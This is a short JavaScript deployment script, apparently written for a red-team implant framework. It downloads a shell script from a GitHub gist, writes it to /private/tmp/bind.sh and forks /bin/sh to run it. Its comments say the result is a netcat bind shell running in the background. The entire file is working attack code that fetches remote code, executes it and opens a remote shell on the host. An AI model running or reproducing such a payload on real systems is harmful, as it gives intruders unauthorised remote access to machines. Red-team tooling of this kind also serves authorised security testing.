// genesis script, spawns a generic bind shell in the background

var hello_world;
var hash;
var fn;

function BeforeDeploy() {
  hello_world = "testing generic netcat bind shell and script pulled from the web";
  console.log(hello_world);
  return true; 
}

function Deploy() {
  var ts = Timestamp();
  var url = "https://gist.githubusercontent.com/ahhh/609cdf5abaa22e233976aec55a3e0dfd/raw/20cce584caeab27c3be3a7a612fda0ec3e99f94d/simple_bind.sh";
  var file_3 = "/private/tmp/bind.sh";
  var response2 = RetrieveFileFromURL(url);
  var response3 = WriteFile(file_3, response2);
  hash = MD5(file_3);
  console.log(hash);
  return true;
}

function AfterDeploy() {
  //DeleteFile(fn);
  ForkExec("/bin/sh", ["/private/tmp/bind.sh"]);
  hello_world = "done test";
  console.log(hello_world);
  return true;
}
